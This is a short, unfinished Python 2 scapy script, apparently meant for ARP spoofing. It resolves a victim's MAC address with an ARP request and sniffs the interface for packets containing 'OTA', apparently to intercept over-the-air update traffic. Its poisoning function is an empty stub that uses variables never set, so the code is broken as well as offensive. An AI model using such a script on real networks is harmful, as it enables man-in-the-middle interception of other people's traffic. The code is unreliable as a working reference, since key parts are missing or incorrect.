from scapy.all import *
import sys

BLOADCASTMAC = "ff:ff:ff:ff:ff:ff"
UNKNOWNMAC = "00:00:00:00:00:00"

InterFace = sys.argv[1]
SenderIp = sys.argv[2]
TargetIp = sys.argv[3]

print "arp spoofing " + sys.argv[2] + " to " + sys.argv[3] + " start!!"

MyMac = get_if_hwaddr(InterFace)
MyIp = get_if_addr(InterFace)

def findMacAddr():
    global SenderMac
    arppkt = Ether(dst = BLOADCASTMAC, src = MyMac)/ARP(op=ARP.who_has, hwsrc=MyMac, psrc=MyIp, hwdst=UNKNOWNMAC, pdst=SenderIp)
    p = sr1(arppkt, iface=InterFace)
    print p.show()

def poison(sIp, tIp):
    arppkt = Ether(dst = SenderMac, src = TargetMac)/ARP(op=ARP.is_at, )


def cb(pkt):
    if "OTA" in str(pkt):
        print "##################################################"
        print "OTA!!!"
        print str(pkt)
        print "##################################################"


findMacAddr()

sniff(iface=InterFace, prn=cb)
